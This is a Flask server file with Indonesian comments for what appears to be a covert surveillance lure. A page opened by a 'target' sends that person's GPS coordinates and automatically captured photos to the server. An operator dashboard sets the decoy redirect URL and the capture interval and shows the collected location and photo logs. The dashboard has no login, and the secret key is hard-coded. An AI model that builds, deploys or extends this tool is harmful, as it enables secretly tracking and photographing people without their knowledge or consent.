import os
import time
from flask import Flask, render_template, request, jsonify, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'super-secret-key-change-this'

# Direktori penyimpan foto hasil capture
UPLOAD_FOLDER = os.path.join('static', 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Konfigurasi Default Dashboard
config = {
    "target_url": "https://www.wikipedia.org",
    "mode": "photo",  # Opsi: 'photo' atau 'stream'
    "photo_interval": 5,  # Interval pengiriman foto (detik)
}

# Data log penyimpanan sementara
captured_data = {
    "gps": [],
    "photos": []
}

@app.route('/')
def device_view():
    """Halaman utama yang dibuka oleh target/pengguna."""
    return render_template('device.html', config=config)

@app.route('/api/gps', methods=['POST'])
def save_gps():
    """Endpoint untuk menerima lokasi GPS (dikirim 1 kali)."""
    data = request.get_json()
    if data:
        entry = {
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        captured_data["gps"].append(entry)
        return jsonify({"status": "success", "message": "GPS saved"}), 200
    return jsonify({"status": "error", "message": "Invalid payload"}), 400

@app.route('/api/upload-photo', methods=['POST'])
def upload_photo():
    """Endpoint untuk menerima pengiriman foto otomatis dari background canvas."""
    if 'photo' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    
    file = request.files['photo']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    
    filename = f"photo_{int(time.time())}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    
    captured_data["photos"].append({
        "filename": filename,
        "url": f"/static/uploads/{filename}",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    })
    
    return jsonify({"status": "success", "file": filename}), 200

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    """Halaman kontrol untuk mengubah URL tujuan, mode, dan melihat log data."""
    global config
    if request.method == 'POST':
        config["target_url"] = request.form.get("target_url", config["target_url"])
        config["mode"] = request.form.get("mode", config["mode"])
        config["photo_interval"] = int(request.form.get("photo_interval", config["photo_interval"]))
        return redirect(url_for('dashboard'))
    
    return render_template('dashboard.html', config=config, captured=captured_data)

if __name__ == '__main__':
    app.run(debug=True)
